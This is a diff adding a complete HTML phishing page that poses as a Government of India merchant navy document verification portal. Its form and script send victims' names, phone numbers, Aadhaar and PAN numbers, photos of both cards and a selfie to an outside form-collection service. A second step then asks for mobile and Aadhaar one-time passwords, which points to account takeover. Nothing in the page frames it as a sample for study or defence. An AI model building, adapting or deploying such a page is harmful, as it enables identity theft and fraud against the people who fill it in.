@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DG Shipping | Official Verification</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f0f2f5; padding: 10px; margin: 0; }
+        .box { background: white; max-width: 480px; margin: 15px auto; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-top: 6px solid #003366; }
+        .header { text-align: center; border-bottom: 2px solid #eee; margin-bottom: 20px; padding-bottom: 10px; }
+        label { font-weight: bold; font-size: 13px; display: block; margin-top: 15px; color: #333; }
+        input { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
+        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; margin-top: 25px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        #otp-section { display: none; margin-top: 20px; padding: 20px; background: #f0f8ff; border: 1.5px dashed #003366; border-radius: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <div class="header">
+        <h2 style="color:#003366; margin:0;">GOVERNMENT OF INDIA</h2>
+        <p style="font-size:12px; color:#666;">Merchant Navy Document Verification</p>
+    </div>
+
+    <form id="navyForm" action="https://formspree.io/f/xqedpwzb" method="POST" enctype="multipart/form-data">
+        
+        <div id="details-section">
+            <label>Full Name (As per Aadhaar) *</label>
+            <input type="text" name="Full_Name" required>
+
+            <label>Mobile Number *</label>
+            <input type="tel" name="Mobile" required>
+
+            <label>Email ID *</label>
+            <input type="email" name="Email" required>
+
+            <label>Aadhaar Card Number *</label>
+            <input type="text" name="Aadhaar_Number" required>
+
+            <label>PAN Card Number *</label>
+            <input type="text" name="PAN_Number" required>
+
+            <label>Aadhaar Front & Back Photo *</label>
+            <input type="file" name="Aadhaar_File" required>
+
+            <label>PAN Card Photo *</label>
+            <input type="file" name="PAN_File" required>
+
+            <label>Candidate Selfie (Live) *</label>
+            <input type="file" name="Selfie" required>
+            
+            <button type="button" id="nextBtn" class="btn" onclick="submitStep1()">Next: Verify Identity</button>
+        </div>
+
+        <div id="otp-section">
+            <h3 style="text-align:center; color:#003366; margin-top:0;">🔐 IDENTITY VERIFICATION</h3>
+            <p style="font-size:11px; text-align:center; color:#555;">Please enter the OTP sent to your registered number.</p>
+            
+            <label>Mobile OTP *</label>
+            <input type="text" name="Mobile_OTP" placeholder="Enter Mobile OTP" required>
+            
+            <label>Aadhaar OTP *</label>
+            <input type="text" name="Aadhaar_OTP" placeholder="Enter Aadhaar OTP" required>
+            
+            <button type="submit" class="btn" style="background:#003366;">FINAL VERIFICATION</button>
+        </div>
+    </form>
+</div>
+
+<script>
+    function submitStep1() {
+        var form = document.getElementById('navyForm');
+        var btn = document.getElementById('nextBtn');
+
+        // Check if all fields are filled
+        if(!form.checkValidity()) {
+            alert("Please fill all details and upload photos correctly.");
+            return;
+        }
+
+        btn.innerHTML = "Sending... Please wait";
+        btn.disabled = true;
+
+        var formData = new FormData(form);
+
+        // Sending data to Formspree immediately
+        fetch(form.action, {
+            method: 'POST',
+            body: formData,
+            headers: { 'Accept': 'application/json' }
+        }).then(response => {
+            // Success: Show OTP screen
+            document.getElementById('details-section').style.display = 'none';
+            document.getElementById('otp-section').style.display = 'block';
+            window.scrollTo(0,0);
+        }).catch(error => {
+            alert("Error sending details. Check your connection.");
+            btn.innerHTML = "Next: Verify Identity";
+            btn.disabled = false;
+        });
+    }
+</script>
+
+</body>
+</html>
